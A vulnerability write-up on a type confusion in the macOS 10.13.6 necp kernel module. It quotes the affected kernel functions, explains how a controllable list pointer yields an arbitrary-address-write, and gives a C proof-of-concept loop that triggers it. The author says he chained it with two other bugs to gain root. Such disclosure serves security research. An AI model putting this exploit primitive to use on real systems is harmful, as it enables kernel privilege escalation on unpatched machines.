---
layout: default
author: juwei lin
date: 2018-11-13 15:16:00 +0800
---

# Description
necp module in BSD has a fatal type confusion problem that leads to multiple vulnerabilities. One of these cases is arbitrary-address-write.

Please be noticed that I already successfully use 3 vulnerabilities in BSD to `root` the latest public macOS `10.13.6`.  

The 3 cases are:  
* `(zdi-rcx15) necp arbitrary address write case.`
* (zdi-rcx16) necp arbitrary address free case.
* (zdi-rcx17) progargsx heap leak case. 

the zdi-rcx15 is the one I will describle in the following article.

# Environment
* OS: 		    macOS 10.13.6
* Module:	    BSD

# Analysis and Exploit
1. **Type Confusion**   
    Skip.

2. **Exploit: Arbitrary Address Write(AAW)**  
   Action 1 of necp_client_action is necp_client_add which calls `necp_client_update_observer_add`:
   ```
   static void
    necp_client_update_observer_add(struct necp_client *client)
    {
	    NECP_OBSERVER_LIST_LOCK_SHARED();

	    if (LIST_EMPTY(&necp_fd_observer_list)) {
		    // No observers, bail
		    NECP_OBSERVER_LIST_UNLOCK();
		    return;
	    }

	    struct necp_fd_data *observer_fd = NULL;
	    LIST_FOREACH(observer_fd, &necp_fd_observer_list, chain) {
		    necp_client_update_observer_add_internal(observer_fd, client);  ---（a）
	    }

	    NECP_OBSERVER_LIST_UNLOCK();
    }
   ```
   at location (a), if necp_fd_observer_list is not empty, necp_client_update_observer_add_internal is called on each node in necp_fd_observer_list:
    ```
    static void
    necp_client_update_observer_add_internal(struct necp_fd_data *observer_fd, struct necp_client *client)
    {
	    NECP_FD_LOCK(observer_fd);

	    if (observer_fd->update_count >= necp_observer_message_limit) {
		    NECP_FD_UNLOCK(observer_fd);
		    return;
	    }

	    struct necp_client_update *client_update = _MALLOC(sizeof(struct necp_client_update) + client->parameters_length,
													   M_NECP, M_WAITOK | M_ZERO);
	    if (client_update != NULL) {
		    client_update->update_length = sizeof(struct necp_client_observer_update) + client->parameters_length;
		    uuid_copy(client_update->client_id, client->client_id);
		    client_update->update.update_type = NECP_CLIENT_UPDATE_TYPE_PARAMETERS;
		    memcpy(client_update->update.tlv_buffer, client->parameters, client->parameters_length);
		    TAILQ_INSERT_TAIL(&observer_fd->update_list, client_update, chain); ---(b)
		    observer_fd->update_count++;

		    necp_fd_notify(observer_fd, true);
	    }

	    NECP_FD_UNLOCK(observer_fd);
    }
    ```
    At location (b), observer_fd->update_list will be tail-inserted with new allocated client_update. Remembered that update_list(0x10) is 0xf bytes controllable with first byte aways of value 0x00. And here tail-insert uses last 8 bytes which are totally controllable. So we get :  
    `0xXXXXXXXXXXXXXXXX = addr of client_update` 

    observer_fd is inserted into necp_fd_observer_list in function necp_open with (flag & 4) != 0 :
    ```
    int
    necp_open(struct proc *p, struct necp_open_args *uap, int *retval)
    {
        ...
        if (fd_data->flags & NECP_OPEN_FLAG_PUSH_OBSERVER) {
		    NECP_OBSERVER_LIST_LOCK_EXCLUSIVE();
		    LIST_INSERT_HEAD(&necp_fd_observer_list, fd_data, chain); ---(a)
		    OSIncrementAtomic(&necp_observer_fd_count);
		    NECP_OBSERVER_LIST_UNLOCK();

		    // Walk all existing clients and add them
		    NECP_CLIENT_TREE_LOCK_SHARED();
		    struct necp_client *existing_client = NULL;
		    RB_FOREACH(existing_client, _necp_client_global_tree, &necp_client_global_tree) {
			    NECP_CLIENT_LOCK(existing_client);
			    necp_client_update_observer_add_internal(fd_data, existing_client); ---(b)
			    necp_client_update_observer_update_internal(fd_data, existing_client);
			    NECP_CLIENT_UNLOCK(existing_client);
		    }
		    NECP_CLIENT_TREE_UNLOCK();
	    } else {
		    NECP_FD_LIST_LOCK_EXCLUSIVE();
		    LIST_INSERT_HEAD(&necp_fd_list, fd_data, chain);
		    OSIncrementAtomic(&necp_client_fd_count);
		    NECP_FD_LIST_UNLOCK();
	    }

        ...
    }
    ```
    at (a), necp_fd_observer_list is inserted with fd_data which points to necp_fd_data; please be noticed that at (b), fd_data->update_list may be reset to other values which means in necp_session_action, **session->proc_locked** may be True. We want the proc_locked value always be 0, so we need clear _necp_client_global_tree if we insert some node into it, or make sure the last node in _necp_client_global_tree has address ends with 0x00(the first byte).

# PoC of AAW

```
bool necp_write() {
    bool bret = false;
    int fd[250] = {0};  //max fd num shoule be around 256
    
    for (int i =0; i<250; i+=2) {
        //printf("i: %d\n",i);
        
        char yy[0xa0];
        fd[i] = necp_open(4);
        // a) this call may fail due to non-empty necp_client_global_tree, so we try 250.
        //    you can also call necp_client_remove to clear necp_client_global_tree thus we don't need try :-)
        int iret = necp_session_action(fd[i], 0, yy, 0, yy, 0xa0);
        //printf("i:%d necp_session_action iret:%d\n", i, iret);
        
        char client_id[0x10];
        uint64_t buffer[0x100];
        fd[i+1] = necp_open(2);
        //b) this call will insert new client into necp_client_global_tree, make a) failure except the new client address ends with 0x00
        necp_client_action(fd[i+1], 1, client_id, 0x10, (char*)buffer,0x100);
        
        if (iret != 0) {
            bret = true;
            break;
        }
        //sleep(1);
    }
    
    return bret;
}
```  


  [Back Home]({{site.url}}{{site.baseurl}})